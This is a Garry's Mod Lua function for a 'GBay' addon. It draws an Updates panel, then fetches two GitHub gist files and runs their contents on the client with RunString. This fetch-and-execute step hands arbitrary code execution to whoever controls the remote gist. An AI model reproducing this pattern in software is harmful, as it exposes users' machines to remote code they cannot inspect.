function GBayViewUpdatesFull(DFrame, data)
	if IsValid(HomePanel) then
		HomePanel:Remove()
	end

	if IsValid(HomePanel2) then
		HomePanel2:Remove()
	end

	if not IsValid(DFrame) then
		return
	end

	LocalPlayer().TabCurrentlyOn = "Updates"
	HomePanel = vgui.Create("DFrame", DFrame)
	HomePanel:SetPos(50, 180)
	HomePanel:SetSize(DFrame:GetWide() - 60, DFrame:GetTall() - 190)
	HomePanel:SetDraggable(false)
	HomePanel:SetTitle("")
	HomePanel:ShowCloseButton(false)
	local gbaywefailed = false

	HomePanel.Paint = function(s, w, h)
		draw.SimpleText("What's new?", "GBayLabelFontBold", w / 2, 30, Color(137, 137, 137, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		draw.SimpleText("Here we can check what is new with GBay!", "GBayLabelFont", w / 2, 50, Color(137, 137, 137, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		draw.RoundedBox(0, 0, 70, w, 2, Color(221, 221, 221))

		if gbaywefailed then
			draw.SimpleText("Looks like something went wrong!", "GBayLabelFont", w / 2, h / 2 - 10, Color(137, 137, 137, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText("Heres what we know... " .. gbaywefailederror, "GBayLabelFont", w / 2, h / 2 + 10, Color(137, 137, 137, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end
	end

	ScrollList = vgui.Create("DPanelList", HomePanel)
	ScrollList:SetPos(0, 80)
	ScrollList:SetSize(HomePanel:GetWide(), HomePanel:GetTall() - 100)
	ScrollList:EnableHorizontal(true)
	ScrollList:SetSpacing(20)
	ScrollList:EnableVerticalScrollbar(true)

	http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/134e58fc74866218b8d0fe7edb01caa0/raw/GBay%2520Updates%2520Versions", function(body)
		RunString(body)

		http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/9ca699471e82b1bde1b26454ffaf6ad1/raw/GBay%2520Updates", function(body2)
			RunString(body2)
		end, function(error)
			gbaywefailed = true
			gbaywefailederror = error
		end)
	end, function(error)
		print("error: " .. error)
	end)
end